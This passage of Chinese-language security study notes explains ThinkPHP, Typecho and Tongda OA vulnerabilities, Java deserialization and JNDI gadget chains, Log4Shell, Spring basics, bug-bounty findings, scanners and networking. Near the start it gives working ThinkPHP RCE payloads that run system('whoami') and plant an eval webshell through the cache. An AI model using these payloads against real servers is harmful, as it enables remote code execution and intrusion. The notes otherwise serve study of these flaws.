_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoamiPOST传入_methond参数为__construct，那么在程序运行中他就会调用__construct方法；在__construct方法中，传入数组即可对Request对象的成员属性进行覆盖，那么就可以给filter[]system等危险函数；我们请求的路由是captcha，按照对应的路由规则，需要让methond参数为get；在param()方法中将当前请求参数和url地址中的参数合并了，给get传whoami等恶意命令，这里get也需要是一个数组；然后在input方法中，使用array_walk_recursive对$data参数也就是我们传入的get数组中的每一个值调用filterValue()方法，在该方法中使用了call_user_func，其中的两个参数就是我们传入的system和whoami。 简略：可以通过POST传入_methond参数值为__construct，然后在程序运行中就会调用__construct方法，可以通过传入数组对其中的成员属性进行覆盖，这里就可以传入system等命令执行函数；然后根据路由规则，需要给一个参数赋值为get，而get需要是一个数组，值又是可控的，所以可以传入需要执行的命令；最后在某个方法中，对我们传入的两个数组进行调用，将数组的内容作为参数传给call_user_func，从而造成RCE。 payload2:_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami第二种方法不同的就是进入的if分支不同，进入methond()方法后，调用了server()，可以给server的REQUEST_METHOD传值为whoami，最后直接调用filterValue()方法执行命令。 5.0.x 缓存RCEpayload：?name=echod&quot;%0Aeval($_GET[1]);//（一句话木马）在\\think\\cache\\driver\\File.php的set()方法中，将name进行md5加密再分解，将前两个字符作为文件目录，剩下的作为文件名；然后将传入的内容进行序列化，再拼接上php标签；%0A是换行符，末尾的//可以注释掉后面拼接的符号；最后使用file_put_contents将拼接后的内容写入前面生成的文件中；所以我们知道了文件保存路径，就可以访问该文件，执行命令。 5.0.x 5.1.x 未开启强制路由导致RCEpayload：?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiThinkPHP默认情况下没有开启强制路由，默认开启的是兼容模式；（路由知识）所以程序会进入parseUrl方法，将传入的控制器等信息分别存在变量中；然后又在bindParams方法中将传入的危险参数值分别存入$args变量中，最后通过反射调用我们传入的invokefunction方法，利用传入call_user_func执行命令。 Typecho反序列化漏洞影响版本：2017年10月24日之前的所有版本漏洞简介：install.php存在反序列化漏洞可执行任意命令实现前台getshell程序运行需要满足两个条件： $_GET[‘finish’]参数不能为空 Referer必须是本站 install.php中的_typecho_config参数可以通过$_COOKIE传入，也可以通过$_POST传入，传入后对这个参数进行了base64解码和反序列化操作，反序列化后的值存入$config变量；然后以$config中的属性作为参数实例化Typecho_Db类，在实例化的过程中会对$adaterName参数进行字符串拼接，根据PHP模式方法的规则，如果给$adaterName参数赋为一个类，那么就会触发_toString()方法；到Feed.php中，访问了$item[&#39;author&#39;]参数的screenName属性，该参数可控，那么给它赋一个没有该属性的类（Typecho_Request），就会触发_get()方法；在get()方法中调用了_applyFilter()方法，该方法中使用了array_map和call_user_func方法，根据前面的限定规则，这里触发的是call_user_func方法，其中两个参数都可控；编写POC，进行序列化和base64编码后再传入。 通达OA未授权文件上传影响版本：V11.3版2017版2016版2015版2013版2013增强版 在upload.php中，只要POST传入一个P值，就可以绕过是否登录的验证，后续再根据DEST_UID和UPLOAD_MODE的值来判断ID是否有效，所以只需要合理控制这三个参数，就可以绕过登录验证来上传文件。任意文件包含导致RCE在/ispirit/interface/gateway.php中，对GET传入的$json参数进行循环解析，只要$json参数的键名等于url，并且值中含有general/或ispirit/或module/时，就可以对传入的url进行包含；所以就可以结合文件上传进行RCE。 任意文件删除影响版本：通达OA V11.6 在/module/appbuilder/assets/print.php中，只判断了GET传入的文件名是否存在，存在即可删除。未授权访问任意文件上传导致RCE因为前面可以任意删除文件，所以就可以把验证权限的文件删除掉，从而实现未授权访问上传的恶意文件，导致RCE。 CMSJava反射Java反射就是把类中的各个组成部分封装成为Java对象，可以在程序运行过程中更方便获取和操作这些对象。 Java RMIRMI就是远程方法调用，就比如客户端可以调用服务端提供的远程对象中的方法；由三部分组成： RMI Registry：JDK提供的一个可独立运行的程序（bin目录下）； RMI Server：服务端程序，对外提供远程对象，代码在这里执行，将执行结果返回给客户端； RMI Client：客户端程序，想要调用远程对象的方法。 可被远程调用的接口必须要继承java.rmi.Remote接口，其中定义的方法要抛出java.rmi.RemoteException异常，只有远程接口中指定的方法是远程可调用的；远程接口的实现类要继承java.rmi.server.UnicastRemoteObject（这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端）；该类必须定义一个显式构造函数，并且抛出java.rmi.RemoteException异常； 服务端将远程对象注册到RMI Registry后，客户端就能请求这个远程对象；客户端通过访问远程对象绑定的端口和名称就可以调用该对象的方法。 服务端将远程对象注册到RMI 注册表中后，会生成对应的Stub，Stub相当于是远程对象的引用或者说是远程对象的一个代理；客户端向注册中心查询远程对象名称，会获得相应的Stub，客户端就通过这个Stub来调用远程方法； RMI反序列化利用： 1. 攻击服务端： 在客户端获取到服务端创建的Stub后，会在本地调用这个Stub并传递参数，Stub会将参数序列化再传给服务端，服务端在接收到参数后会将参数反序列化并调用； 如果服务端存在反序列化利用链，并且传入的参数是一个恶意的Object类型，那么就可能收到反序列化攻击。 动态类加载： 当本地ClassPath中无法找到相应的类时，会在指定的codebase里加载class。（这个特型在6u45&#x2F;7u21之前都是默认开启的） Client端可以通过配置 java.rmi.server.codebase属性，向Server端传递不存在的类，那么Server端就会从codebase地址中远程加载恶意类，从而触发攻击。 （使用RMI进行攻击需要两个条件，一个是接收Object类型的参数，第二个是RMI的服务端存在反序列化RCE利用链；） 在远程接口中定义一个接受object类型参数的方法，在实现类中实现这个方法，在客户端中调用这个方法，Object参数的内容是对应利用链的poc；由于RMI在传输数据的时候会将数据序列化，传输完成后再反序列化，所以当POC反序列化时就会触发我们构造的代码。 2.攻击Registry端 Server端向Registry端绑定的服务对象时Server端生成的动态代理类，Registry端会反序列化这个类并存在自己的RegistryImpl类的bindings中，供以后查询； 如果Server端向Registry端发送了一个恶意的对象，那么Registry端就可能受到反序列化攻击。 （bind的参数是Remote类型的，所以可以使用AnnotationInvocationHandler 动态代理 Remote 接口，将参数类型转换成Remote） Client端向Registry端查询(远程对象)的时候也是将查询的名称进行序列化传输，Registry接收到请求后会将其反序列化，所以如果Client端如果传输的是一个恶意类，那么Registry端也可能受到攻击。 3. 攻击Client端由于Client端会从Registry端获取Server端注册的对象并反序列化，还会从服务端获取返回的结果并反序列，所以Client同样可能受到Server端和Registry端的攻击。 Java序列化和反序列化Java 序列化：把Java对象转换为字节序列的过程（存放到硬盘中）；Java 反序列化：把字节序列还原为Java对象的过程（存放到内存中）； Java类需要实现java.io.Serializable接口，才能进行序列化和反序列化操作；(父类实现了，其子类不用在实现)（通过Serializable接口对对象序列化的支持是内建于核心 API 的）与Externalizable接口的区别在于，Externalizable的所有实现类必须提供读取和写出的实现，也就是实现它的两个方法(writeExternal()``readExternal())才能使对象的状态持续下来，否则在反序列化的时候对象的所有参数值都会恢复成为默认值； ObjectOutputStream类：序列化流，将对象序列化输出到文件中保存（writeObject）；ObjectInputStream类：反序列化流，将序列化数据恢复成对象(readObject)； transient声明的变量不被序列化到文件中，反序列化时，int恢复为0，对象型恢复为null； 静态变量：静态变量是属于类的状态，而序列化只保存对象的状态，所以序列化时并不保存静态变量，因此在反序列化前改变静态变量，反序列化后静态变量的结果会一起改变； serialVersionUID：即序列化版本号，是Java程序运行时环境根据类的内部细节自动生成的；该序列号在反序列化过程中用于验证序列化对象的发送者和接收者是否为该对象加载了与序列化兼容的类。如果接收者加载的该对象的类的 serialVersionUID 与对应的发送者的类的版本号不同，则反序列化将会导致 InvalidClassExceptio。如果对类的源代码进行了修改，再重新编译，新生成的类文件的serialVersionUID的取值有可能也会发生变化；建议显式定义serialVersionUID。 Java JNDI一、概述 JNDI全称是Java命名和目录接口，是Java中为命名和目录服务提供接口的API（查询远程对象。） Naming是指将对象通过唯一标识符(取个名字)绑定到一个容器环境Context中，以后又可以使用lookup方法从环境容器中根据这个唯一标识符找到所绑定的Java对象。 Context本身也是一个Java对象，它可以通过一个名称绑定到另一个容器中； 目录是指将一个对象的所有属性信息保存到一个容器环境中，提供对属性的操作； 过程（服务端-攻击者，客户端-被攻击者） 服务端将Reference对象绑定到指定端口和名称下，这个对象中构造了对远程对象的引用和factory类名及位置；客户端使用lookup方法获取到Reference对象后，会获取对象中的Factory类，通过Factory类将Reference对象转为具体的示例；当本地找不到Factory类时，会从指定的地址去加载。如果lookup的的参数可控，那么就可以指定加载远程恶意类，从而造成RCE。 服务端使用RefereneWrapper封装了一个Reference对象，这个对象中构造了对远程对象的引用和factory类名及位置，然后将封装后的对象绑定到一个名称上；客户端要先创建一个Context对象，然后使用lookup进行查询；客户端会得到一个从ReferenceWrapper_Stub返回的Reference对象，然后从中获取Factory类，先尝试从本地加载，加载不到就使用指定的url进行远程加载。 造成JNDI注入的原因是查询的远程对象可控（lookup(url)中的URL可控，），通过构造恶意远程对象，对目标服务发起攻击。 区分 RMI 和 JNDI：RMI 是绑定了远程对象后，通过 lookup 查找对象，再调用它的方法； JNDI 是除了使用 RMI 绑定的远程对象外，还可以通过 References 类来绑定一个 外部的远程对象，不在当前目录系统中（没有在注册中心里），这个远程对象可以是我们构造恶意对象，当通过 lookup 来查找这个远程对象时，会动态加载并实例化从 References 对象中获得的 Factory 类，从而执行其中的恶意代码。（不需要调用它的方法） RMI、JNDI高版本限制： RMI 当客户端加载远程对象的时候，会先从本地 classpath 中去寻找，如果找不到，则向指定的 codebase 去获取，必须要求 RMI 的上下文环境允许访问远程 codebase， 并且java.rmi.server.useCodebaseOnly的值为 false； 从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly的值默认设置为true，就不能从 codebase 加载远程类，只能加载本地 classpath 里的类。 RMI + JNDI 当客户端从返回的 References 对象中获取到 Factory 类后，也会先从本地 classpath 中去寻找找不到再从远程 codebase 加载，但是并不受前面useCodebaseOnly属性的影响； 而是受com.sun.jndi.rmi.object.trustURLCodebase和 com.sun.jndi.cosnaming.object.trustURLCodebase的影响，当这两个属性为 true 时，允许从远程 codebase 加载，为 false 则不允许； 从 JDK 6u132、7u122、8u121开始，这两个属性默认为 false ，不允许从远程 Codebase 加载。 LDAP + JNDI LDAP 服务也是先从本地 classpath 加载，找不到就从远程 codebase加载； 但是不受前面的属性影响，而是受 ldap 中的trustURLCodebase属性影响，值为 true 时允许加载，为 false则不允许；（com.sun.jndi.ldap.object.trustURLCodebase） 从 JDK 6u211、7u201、8u191、11.0.1之后，该属性值默认设为 false。 绕过高版本限制： 从受害者本地的 classpath 中找一个可利用的类来执行恶意命令（能由攻击者传入恶意参数）； 如果受害者主机存在反序列化利用链，就可以通过 LDAP 直接返回一个恶意的序列化对象，当受害者端对其进行反序列化的时候，就能成功执行命令。 Java动态代理一、静态代理在程序运行前就已经存在代理类的字节码文件，代理类与被代理类的关系在运行前就确定了。代理类和被代理类要实现同一个接口，只能调用接口中定义的抽象方法； 缺点：1.由于代理类需实现与目标对象相同的接口，当有多个需被代理的类时，只有两种方法： 只创建一个代理类，这个代理类同时实现多个接口及其抽象方法，但是会导致代理类过于庞大； 创建多个代理类，每个代理类对应一个被代理类，但是会长生过多代理类；2.当接口需要增加、删除、修改方法时，被代理类和代理类的代码都要修改，代码量过大，不易维护。 二、动态代理动态代理的代理类是在程序运行期间由JVM根据反射等机制动态生成的，程序运行前并不存在代理类的字节码文件。 实现步骤：动态代理通过实现InvocationHandler接口创建自己的调用处理器；使用Proxy 类的newProxyInstance 方法来生成动态代理实例，针对不同的被代理类，传入相应的处理器；（指定ClassLoader对象和一组interface）在处理器中会利用invoke方法获得动态代理对象的方法和参数并执行。 Java URLDNSjava.util.HashMap重写了readObject方法，在反序列化时会调用hash函数计算key的hashCode，而java.net.URL的hashCode在计算时会调用getHostAddress来解析域名，从而发出DNS请求. 利用链： HashMap-&gt;readObject() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() Java Commons Collections 1TransformedMap在AnnotationInvocationHandler类的readObject()方法中调用了setValue()方法，在调用setValue()方法时会自动调用checkSetValue()方法从而触发transform()方法对我们构造的数组进行回调，从而执行命令。 反射获取RunTime()对象，创建一个Transformer类型的数组；使用ChainedTransformer对数组进行回调，那么就要调用到transform()方法；使用TransformedMap对Map对象进行修饰，在setValue方法下调用了checkSetValue()方法，该方法使用了transform()方法对数组进行回调；反射获取AnnotationInvocationHandler类对象，在它的readObject()方法中，只要满足两个条件，就会调用setValue方法，从而执行命令。（第一个参数必须是Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设方法名为X；被TransformedMap.decorate修饰的Map中必须有⼀个键名为X的元素） 这条链只适用于8u71以前的版本，以后的版本由于AnnotationInvocationHandler发⽣了变化导致不再可⽤. LazyMap这条链的区别在于调用transform()方法的位置不同；在LazyMap的get()方法中，当传入的参数不在map中时，就会进入if分支执行factory.transform()，factory是可控的，传入Transformer数组，就可以对数组进行回调，从而执行命令；要调用到get()方法，就要利用到动态代理的知识；在调用被代理对象的任意方法时，会触发被代理类的invoke方法，而在AnnotationInvocationHandler类的invoke方法中刚好调用了get()方法；所以通过反射获取AnnotationInvocationHandler类对象，为其创建一个代理对象。 Java Commons Collections 2并且使用的是commons-collections-4.0版本，该版本删除了lazyMap的decode方法，所以CC1不用4.0版本；而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本。 CC2也包含了两条利用链 这条链的关键点在于TransformingComparator类中实现了compare()方法，compare()方法里调用了transform()；首先创建一个PriorityQueue对象，先让它的comparator变量为null；然后要满足队列中元素个数大于一个，再通过反射获取PriorityQueue对象的comparator变量，将它赋值为TransformingComparator类的实例化对象，这样才既能生成反序列化文件，又能执行命令。 Javassitjavassit可以直接编辑和生成字节码文件；Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。 使用javassit生成一个含有恶意命令的类，将生成的字节码传入到TemplatesImpl类的对象中，再将对象传入PriorityQueue类对象的queue变量里；这里仍然一设置队列长度大于1；然后再通过反射获取PriorityQueue对象的comparator变量，将它赋值为TransformingComparator类的实例化对象；当进入到compare()方法时，其中的transformer参数可控，可以设置为InvokerTransformer，所以就是调用InvokerTransformer.transform()，在这个transform()中，我们把this.iMethodName的值为设为了的newTransformer；这个方法继续跟下去，到最后，通过loader.defineClass将我们传入的含有恶意代码的字节数组还原为Class对象，然后再实例化这个对象，那么就执行其中含有的恶意代码。 Commons Collections 3CC3可以说是CC1H和CC2的结合版；和CC1一样，通过动态代理触发AnnotationInvocationHandler的invoke方法，从而触发LazyMap的get方法，进而触发transform()方法；触发了transform()方法就会对我们传入的数组进行回调，构造数组内容。将TrAXFilter类返回给InstantiateTransformer，在这个类中会实例化TrAXFilter类，所以会调用到它的构造方法，在它的构造方法中调用到了newTransformer()方法，将newTransformer()方法的参数设为javassit生成的恶意的字节码文件，就和CC2一样，最后将字节码文件还原为Class对象，再实例化这个对象，从而执行里面的恶意代码。 Commons Collections 4CC4和CC2一样通过调用TransformingComparator.compare()来实现transform()方法的调用；然后和CC3一样，通过实例化TrAXFilter类，然后调用它的构造方法，进而实现newTransformer()的调用，最后实例化javassit生成的恶意对象来执行恶意代码； Commons Collections 5CC5是通过BadAttributeValueExpException.readObject()触发TiedMapEntry.toString()，然后调用getValue()，接着调用到map.get()方法，map可以设为LazyMap，所以就是调用了LazyMap.get()，和前面一样，继续触发transform()，对构造的命令执行的数组进行回调，从而执行命令。 Commons Collections 6CC6是通过HashSet#readObject中的map.put()，逐步跟到TiedMapEntry#hashCode，hashCode()方法中调用了getValue()，和CC5一样，进而调用到map.get()。 Commons Collections 7CC7是在Hashtable#readObject，根据传入元素的个数循环调用reconstitutionPut，在这个方法中，会在for循环里调用e.key.equals()，当传入两个元素时，就会进入这个for循环，还得保证传入的两个key值的hash值要相等（zZ，yY）;进入for循环后，就接着AbstractMap#equals方法中调用了m.get()，m可控，就可以传入LazyMap类对象，从而调用到LazyMap.get()。 Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）主要原因就是在答应日志的过程中，会识别$&#123;&#125;，并且按第一个分号将我们传入的字符串拆分开，判断分号前的部分是什么，比如我们传入 JDNI 表达式的话，分号前面就是 jndi，就允许通过 JDNI 来检索分号后面的命名对象，从而实现远程类的加载。 代码上的关键点就在于toSerializable()方法中，循环调用了formatters数组中的每个对象的 format 方法，而在其中一个对象的 format 方法下，就是对传入的 message 进行拆分并解析，最后调用到 looup 加载远程的恶意类。 SpringSpring是一种基于 Bean 的编程技术。特点： 降低耦合度，简化开发，方便集成其他框架。 两个核是 IoC 和 AOP； IoC译为控制反转，平常我们是先 new 一个对象，再调用它的方法；Spring则是把创建对象的过程交给 IoC 容器来实现，我们直接调用它的方法就行了。 Spring 提供 BeanFactory 和 ApplicationContext两种类型的 IoC 容器；BeanFactory 采用懒加载（lazy-load）机制，容器在加载配置文件时并不会立刻创建 Java 对象，只有程序中获取（使用）这个对象时才会创建。（通常不提供给开发者使用）ApplicationContext 是 BeanFactory 接口的子接口，对 BeanFactory 进行了扩展。（加载配置文件，创建和初始化所有对象，然后 getBean()）；常用实现类： ClassPathXmlApplicationContext，加载类路径 ClassPath 下指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作； FileSystemXmlApplicationContext，加载指定的文件系统路径中指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作。 对象之间的依赖关系都是在配置文件中定义的，修改时只用该配置文件就好了，不用修改Java 代码；（底层实现为解析 xml 文件 和反射创建对象。） Bean 就是由Spring IoC 容器管理的对象，在配置文件中定义 ，&lt;bean&gt;标签 id 指定bean 的名称，class 指定类，&lt;property&gt;标签可以给属性赋值；（ref 指向引用类型）Bean 继承时对象层面的继承，会继承父 Bean 的属性值。 scope作用域：单例模式，原型模式，request，session，application，websocket； 依赖 通过 depends-on=&quot;&quot;确定依赖关系，被依赖的 Bean 先创建； Bean属性注入： 使用&lt;property&gt;和&lt;constructor-arg&gt;对属性进行赋值；DI注入也是其中的一种；分别可以用p 命名空间和c 命名空间来表示。 自动装配：让Spring 根据配置文件中自动装配的规则寻找到在一个 Bean 中所注入的另一个 Bean，就不用使用 ref 属性来关联了；autowire 属性，五种规则：byName，byType，constructor，default，no AOP面向切面编程，就是说当多个业务方法都要实现一段相同的代码时，可以把这部分代码取出封装起来，抽象成一个切面，在程序运行时，将封装的代码切入到指定方法的指定位置上，这样可以减少重复的代码。 优点： 降低耦合度，使程序功能更容易扩展，更好的代码复用。实现： 将所有重复的代码写在切面类中，Spring 会自动根据切面类生成一个代理对象，当调用它的方法的时候就会在需要的时候到切面类中执行相应的方法；注解： @Aspect、@Component、@Befor、@After、@AfterReturning、@AfterThrowing自动扫描：context:component-scan使 @Aspect 生效：&lt;aop:aspectj-autoproxy&gt;依赖注入DI就是对象与对象之间存在依赖关系，例如一个类中的属性，是另一个类的对象。 Spring MVCModel-View-Controller(模型-视图-控制器)；Model 用于处理业务逻辑、访问数据库等；View 用于与浏览器交互，展示数据；Controller 负责将用户的求交给相应的 Model 进行处理，然后将处理完的数据交给相应的 View 进行渲染展示给用户。优点： 降低耦合度，有利于分工合作。核心： 是DispatcherServlet，它是 Spring MVC 的前端控制器，主要负责对请求和响应的统一地处理和分发。 MVC 工作流程： 注解： @Controller该注解可以将一个普通的Java类标识成控制器(Controller)类。 @RequestMapping该注解通常被标注在控制器的方法上，负责将请求与处理请求的控制器方法关联起来，建立映射关系。 SRC （高危）发现一个因为缺少对用户身份的二次验证，导致可以任意修改用户的手机号；用户是通过 手机号+验证码 登录的，有一个修改用户信息的地方，显示只能修改用户名和所在单位等信息，通过抓包观察，在修改信息的返回包中会返回用户的所有信息，包括用户id，手机号，名称单位什么的；我把手机号字段添加到请求包中，修改为另一个手机号发送，在返回包中就可以看到返回的是我修改后的手机号，这期间没有对我的操作进行任何验证；然后重新用修改后的手机号登录，显示的就是之前这个用户的所有信息；而原来那个手机号就成了未注册的手机号，登录会要求重新填写用户信息。如果攻击者通过某种手段登录到了用户的账号，就可以随意更改手机号，给用户造成很大的损失。 (高危) 是一个电商平台，可以注册商家，有上传头像的功能，抓上传头像的包，可以看到请求里有一个图片地址的字段，把这个字段的值改为1，发送；页面显示拒绝服务，无论怎么刷新都拒绝服务，重新登录也是拒绝服务； 并且还存在 CSRF ，构造上传头像为 1 的 POC，让其他商家点击，那么他们的也会被拒绝服务，无法再对账号进行操作，造成损失。 （中低危）抓包修改用户id，实现越权访问； 抓包重复 repeater，因为只验证了cookie存在情况，没有验证空cookie，就可以实现无限点赞； 扫描器主动扫描，被动扫描主动扫描：输入URL，然后由扫描器中的爬虫模块爬取所有连接被动扫描：通过代理将流量转发给漏洞扫描器，不使用爬虫进行大规模的爬取。主动扫描，被动扫描 portscanner 接收三个参数，-a参数是扫描目标的地址，可以是域名，也可以是IP；-p参数是要扫描的端口号，可以是单个指定端口，也可以是多个指定端口，或者是指定端口范围，默认是扫描1-1024端口（和一些1024以上的常见端口号）；-t参数就是设置进程数，默认为30；-T参数就是选择是进行TCP扫描，-S是选择进行SYN扫描。 首先呢就是判断输入的是域名还是IP，是域名的话就会先将域名解析成IP，然后判断输入的是指定端口个数，还是端口范围；再分别对各端口进行TCP连接，并且获取端口对应的服务信息；如果是指定了端口号，将连接成功的端口号输出标为open，连接失败的输出标为close；如果是端口范围，则只输出连接成功的端口号；端口扫描完后会输出一共开放的端口个数，以及本次扫描一共用了多长时间。 优化：提高扫描效率，丰富扫描结果。 nmap缺点：扫描速度慢 masscan：只能扫描端口 varscanner接收一个参数，可以是单个域名，也可以是一个包含多个域名的文件；首先使用oneforall进行子域名收集，将生成的csv文件中的subdomain那一列的子域名提取出来，保存到一个txt文件中，并去重；然后分别向这些网站发送request请求，将访问失败的子域名去掉，只留下有用的；再用JSFinder对网站进行深度扫描，将爬取的子域名添加到oneforall扫出来的子域名文件中，以补充oneforall没有扫出的子域名，然后再去重；这样就收集到了比较完整的子域名了；然后开启xray监听，使用rad爬虫爬取网站的数据，代理到xray上，结合rad高速爬虫和xray的漏洞扫描，实现更高效的扫描。 对多个工具进行集成，更方便自己使用。缺点：效率不怎么高 计算机网络TCP&#x2F;IP网络分层模型：网络接口层——网际层——传输层——应用层OSI七层模型：物理层——数据链路层——网络层——传输层——会话层——表示层——应用层五层协议体系结构：物理层——数据链路层——网络层——传输层——应用层一、浏览器解码顺序URL、HTML、CSS、JS HTTPS握手过程 客户端向服务端发起请求，服务端响应请求，将CA证书发送给客户端，证书中包含公钥（和其他相关信息）； 客户端解析证书，确认证书的真假和有效性，如果证书不可信或者已过期，浏览器会弹出警告询问是否继续通信； 证书没问题的话，客户端就会取出证书中的公钥，使用公钥对一个随机生成的密钥值加密并发送给服务端，这个密钥作为后门通信中对称加密的密钥； 服务端收到加密密钥后使用私钥对其解密，这样双方都拥有了对称加密的密钥，可以使用对称加密进行数据传输了。 HTTP与HTTPS的区别： HTTP是明文传输，安全性较差；HTTPS是加密传输，安全性较高； HTTPS需要申请CA证书； HTTP页面响应速度比HTTTPS快，因为HTTPS通信过程更复杂； HTTPS更耗费服务器资源，因为构建在SSL&#x2F;TLS之上的HTTP协议； 连接的端口不一样，443，80 SSL&#x2F;TLS握手过程： 客户端发起请求，请求中包含客户端所支持的TLS版本和多种密码组合，以及一个随机字符串； 服务端响应请求，响应包中包含数字证书，服务端所选择的密码组合，以及一个随机字符串； 客户端对证书进行验证，判断是否合法，确认过后向服务器发送一个经公钥加密的随机字符串； 服务端使用私钥将随机字符串解密，然后客户端和服务端将三个随机字符串使用相同的算法生成一个新的密钥； 双方互相发送新密钥生成的结束信号，握手完成，就可以使用新密钥进行对称加密通信了。 应用层协议基于TCP：FTP、Telent、SMTP、HTTP、POP3、SSH基于UDP：DNS、TFTP简单文件传输协议、RIP路由选择协议、DHCP、IGMP TCP：传输控制协议，面向连接，提供可靠的数据传输，建立传输通道，超时重传，一对一连接，三次握手，四次挥手。 UDP：用户数据报协议，面向无连接，数据不可靠传输，不提供报文到达确认，多对一，一对多，一对一，不需要建立通道和关闭通道；传输速度快。 密码学对称加密：AES、DES、3DES非对称加密：RSA、DSA数字签名用、ECC椭圆曲线密码编码学hash算法-单向加密：MD2 4 5，SHA -1 工具原理oneforall子域名收集方式： 字典爆破 利用证书透明度收集 利用网上爬虫档案收集 利用DNS数据收集 利用DNS查询收集 利用威胁情报平台数据收集 利用搜索引擎 支持泛域名解析 Rad一款浏览器爬虫。模仿人的行为，触发JS对应的操作。 浏览器爬虫的难点并不是在于发现页面上的已经由后端渲染的 Url 或者其他资源链接，而是加载 JS；并且按照“人”的逻辑，触发 JS 对应的操作。然而这些操作会对页面产生一些“无法预料”的影响。所以，进行 Human-Like 的 JS 行为触发，并捕捉出发 JS 导致的变化和过程中产生的 HTTP 请求，其实才是实现浏览器爬虫的难点。 rad+xray：整体系统启动之后，rad 会将流量输入到 MITM 桥接代理链，代理链将镜像流量存入数据库，并同时转发到 xray；xray 进行漏洞扫描，webhook 将漏洞扫描结果输入到系统漏洞库中。 有什么资产：主机、端口、服务等；而服务的细分版本、指纹；如果这个服务是 Web 应用，那么对应的域名、网站结构也是资产。还有： 没有对应 web 服务(也可能是没有扫描到的)的域名； 挖掘网站结构时候产生的 HTTP 请求和响应； 从网站相关的 HTTP 请求和响应中挖掘出的网站可能的信息： 网站的开发语言 第三方开发组件 JS库等 网站暴露的一些手机号、邮箱等信息 Classloader类加载机制分为显式和隐式，显式指通过反射或调用Classloader来加载类；隐式指通过类名.方法名和 new 来加载。加载流程： 调用 findLoadedClass 检查该类是否已经初始化，若已经初始化，就直接返回该类的对象； 若没有就使用父类加载器或 Bootstrap ClassLoader 加载 若加载不到就调用自身的 findClass JDBC流程： 先注册驱动&#96;public interface Driver 然后建立连接，返回一个连接对象； DriverManager.getConnection(xxx) 创建Statement对象，执行 SQL 语句 如果式查询语句，就创建ResultSet对象保存查询结果 Statement 和 PrepareStatement的区别：Statement 是将用户传入的参数插入后再执行 sql 语句，每次执行sql 语句都要进行重新编译一次，这样存在 sql 注入的风险；PrepareStatement 可以先用占位符对传参的位置进行占位，进行编译，当用户传入参数后，将参数插入进去，然后执行；只用编译一次，能有效防止 sql 注入。 数据库连接池建立一个缓冲池，预先向池子中放入若干连接对象，需要连接数据库的时候就直接从连接池中获取连接对象，不用再重新注册驱动和建立连接；用完又把对象放回连接池中常见的数据源有：DBCP、C3P0、Druid、Mybatis DataSource，他们都实现于javax.sql.DataSource接口。 将连接池的配置信息写到配置文件中，避免每次修改连接信息都重新编译 Java 文件； DBUtils： 他的query()封装了创建 Statement 、编译执行sql语句、结果返回等操作 CTF"}]